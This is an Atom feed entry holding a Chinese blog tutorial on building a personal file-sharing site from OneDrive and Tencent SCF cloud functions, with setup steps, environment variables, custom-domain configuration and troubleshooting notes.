    <link href="https://www.mad-coding.cn/2019/12/02/%E4%BD%BF%E7%94%A8%E8%85%BE%E8%AE%AFSCF-onedrive%E6%90%AD%E5%BB%BA5T%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98/"/>
    <id>https://www.mad-coding.cn/2019/12/02/使用腾讯SCF-onedrive搭建5T个人网盘/</id>
    <published>2019-12-02T00:56:09.000Z</published>
    <updated>2019-12-02T06:27:00.936Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前几日在群里看到有人使用腾讯的SCF（云函数）+onedrive来搭建属于自己的个人网盘，对此我颇有兴趣今日就来研究研究，今将研究结果奉上，如有不足之处，还请提出改正，共同进步。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202093328.png" class="lozad"></p><a id="more"></a><h1 id="0x01-需求准备"><a href="#0x01-需求准备" class="headerlink" title="0x01 需求准备"></a>0x01 需求准备</h1><ol><li>onedrive账号（推荐教育版5T）</li><li>onedrive_SCF源码</li><li>个人域名</li><li>腾讯云账号</li></ol><h1 id="0x02-申请5T空间"><a href="#0x02-申请5T空间" class="headerlink" title="0x02 申请5T空间"></a>0x02 申请5T空间</h1><p>原理就是使用临时邮箱申请5T空间，之前的那个申请网站由于被人恶意使用短信炸弹轰炸，已经不能收到短信了，所以，今天推荐另一个网站。</p><blockquote><p>ps:个人不保证不会翻车，大家可以用来做自己的备份云盘。</p></blockquote><p>申请5T空间：<a href="http://233455.xyz:3000/" target="_blank" rel="noopener">传送门</a></p><p>申请教程可参考我的另一篇文章：<a href="[https://www.mad-coding.cn/2019/08/09/onedrive-oneindex%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98/](https://www.mad-coding.cn/2019/08/09/onedrive-oneindex打造属于自己的个人网盘/)">onedrive+oneindex打造属于自己的个人网盘</a></p><h1 id="0x03-开启搭建之路"><a href="#0x03-开启搭建之路" class="headerlink" title="0x03 开启搭建之路"></a>0x03 开启搭建之路</h1><h2 id="3-1-下载-onedrive-SCF源码"><a href="#3-1-下载-onedrive-SCF源码" class="headerlink" title="3.1 下载 onedrive_SCF源码"></a>3.1 下载 onedrive_SCF源码</h2><blockquote><p><a href="https://github.com/Tai7sy/OneDrive_SCF" target="_blank" rel="noopener">https://github.com/Tai7sy/OneDrive_SCF</a></p></blockquote><h2 id="3-2-注册腾讯云"><a href="#3-2-注册腾讯云" class="headerlink" title="3.2 注册腾讯云"></a>3.2 注册腾讯云</h2><blockquote><p><a href="https://cloud.tencent.com/" target="_blank" rel="noopener">https://cloud.tencent.com/</a></p></blockquote><h2 id="3-3-配置云函数"><a href="#3-3-配置云函数" class="headerlink" title="3.3 配置云函数"></a>3.3 配置云函数</h2><h3 id="3-3-1-新建云函数"><a href="#3-3-1-新建云函数" class="headerlink" title="3.3.1 新建云函数"></a>3.3.1 新建云函数</h3><p>登录腾讯云函数平台后，新建一个云函数，地区选择香港或者新加坡地区。创建的云函数名称随便填写，运行的环境选择PHP7.2 ，创建方式选择模板函数；模板选择helloword模板，下一步直接完成。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202095348.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202100001.png" class="lozad"></p><p>创建一个新的函数服务，地址选择<code>中国香港</code></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202100014.png" class="lozad"></p><p>新建一个<code>helloworld</code>模板函数</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202100021.png" class="lozad"></p><p>拉到最下面，点击下一步，然后点击完成</p><h3 id="3-3-2-上传onedrive-SCF文件夹"><a href="#3-3-2-上传onedrive-SCF文件夹" class="headerlink" title="3.3.2 上传onedrive_SCF文件夹"></a>3.3.2 上传onedrive_SCF文件夹</h3><p>从GitHub下载OneDrive_SCF源码，进入函数服务选择函数代码，提交代码选择本地上传文件夹，上传刚才解压的文件夹（注意：如果解压了双层文件夹需要点入第二个文件夹）</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202100324.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202100422.png" class="lozad"></p><h3 id="3-3-3-添加触发方式"><a href="#3-3-3-添加触发方式" class="headerlink" title="3.3.3 添加触发方式"></a>3.3.3 添加触发方式</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202100428.png" class="lozad"></p><p>选择<code>API网关触发器</code>，勾选<code>启用集成响应</code>，然后点击保存。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202100634.png" class="lozad"></p><p>然后会生成一个访问路径。点击这个路径</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101707.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101712.png" class="lozad"></p><h3 id="3-3-4-新建密钥"><a href="#3-3-4-新建密钥" class="headerlink" title="3.3.4 新建密钥"></a>3.3.4 新建密钥</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101736.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101746.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101750.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101819.png" class="lozad"></p><p>然后使用微信扫描二维码，获得密钥全部的内容</p><h3 id="3-3-5-添加环境变量"><a href="#3-3-5-添加环境变量" class="headerlink" title="3.3.5 添加环境变量"></a>3.3.5 添加环境变量</h3><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101909.png" class="lozad"></p><p>将刚刚的新建的秘钥添加到环境变量中。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101913.png" class="lozad"></p><p>添加完成</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101919.png" class="lozad"></p><p>其他的环境变量添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sitename=站点名称</span><br><span class="line">private_path=Onedrive根路径（绑定自定义域名使用）</span><br><span class="line">public_path=Onedrive根路径（未绑定自定义域名使用）</span><br><span class="line">passfile=.password(加密文件)</span><br><span class="line">admin=管理员密码</span><br></pre></td></tr></table></figure><h3 id="3-3-6-开始安装"><a href="#3-3-6-开始安装" class="headerlink" title="3.3.6 开始安装"></a>3.3.6 开始安装</h3><p>再次刷新刚刚的错误页面</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202101950.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102007.png" class="lozad"></p><p>登录OneDrive账号，这里我已经登录过了，直接选择就行了。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102013.png" class="lozad"></p><p>成功登录后自动跳转到云盘</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102058.png" class="lozad"></p><h3 id="3-3-7-自定义域名设置"><a href="#3-3-7-自定义域名设置" class="headerlink" title="3.3.7 自定义域名设置"></a>3.3.7 自定义域名设置</h3><p>点击触发方式，然后点击API服务名</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102115.png" class="lozad"></p><p>选择自定义域名，新建。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102120.png" class="lozad"></p><p>在域名厂商设置域名解析，我域名是在腾讯买的，所以直接到域名解析出添加一个域名解析记录，主机记录就是二级域名，记录类型是CNAME（域名指向域名），记录值填触发方式中的访问路径。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102128.png" class="lozad"></p><p>设置完域名解析后，在到自定义域名除继续设置。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102134.png" class="lozad"></p><blockquote><p>ps:没有证书的话，就选择http协议。</p></blockquote><p>在index.php中的609行左右，添加域名协议的代码</p><script>  if (location.protocol === "http:") {    location.href = location.href.replace(/http/, "https");  }</script><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102138.png" class="lozad"></p><p>再次使用域名访问，显示没有uri路径设置有问题。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102156.png" class="lozad"></p><p>重新修改路径</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102203.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102208.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102212.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202102216.png" class="lozad"></p><p>再次使用域名访问</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202103229.png" class="lozad"></p><h1 id="0x04-采坑记录"><a href="#0x04-采坑记录" class="headerlink" title="0x04 采坑记录"></a>0x04 采坑记录</h1><h3 id="4-1-创建权限错误"><a href="#4-1-创建权限错误" class="headerlink" title="4.1 创建权限错误"></a>4.1 创建权限错误</h3><p>在创建API网管触发器的时候，出现操作未授权的错误，和教程不一样，网上也搜不到相关的信息。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202104550.png" class="lozad"></p><p>解决方法：其实就是用户自己没有授权，重新返回主页在点击去时会弹出授权，直接授权就好了。</p><h1 id="0x05-甩锅"><a href="#0x05-甩锅" class="headerlink" title="0x05 甩锅"></a>0x05 甩锅</h1><ol><li>教育版的5T空间可能会翻车，如果翻车，与作者无关奥。</li><li>腾讯SCF现在开始收费了，之前是免费的，所以大家可以当做一个技术来学习，当前，不在乎这点钱的话可以考虑继续使用奥，具体的收费标准请自己到官网查看。</li><li>设置了自定义域名后，可在互联网上直接发访问，所以一些私密的文件请不要上传到该网盘中，并且最好给文件夹加上密码，造成内部资料的泄露，作者不负责任奥。</li></ol><h1 id="0x06-参考连接"><a href="#0x06-参考连接" class="headerlink" title="0x06 参考连接"></a>0x06 参考连接</h1><p><a href="https://eebk.com/archives/30.html" target="_blank" rel="noopener">https://eebk.com/archives/30.html</a></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;前几日在群里看到有人使用腾讯的SCF（云函数）+onedrive来搭建属于自己的个人网盘，对此我颇有兴趣今日就来研究研究，今将研究结果奉上，如有不足之处，还请提出改正，共同进步。&lt;/p&gt;
&lt;p&gt;&lt;img alt data-src=&quot;https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191202093328.png&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="其他文章" scheme="https://www.mad-coding.cn/categories/%E5%85%B6%E4%BB%96%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="个人网盘" scheme="https://www.mad-coding.cn/tags/%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98/"/>
    
      <category term="SCF" scheme="https://www.mad-coding.cn/tags/SCF/"/>
    
  </entry>
  
</feed>
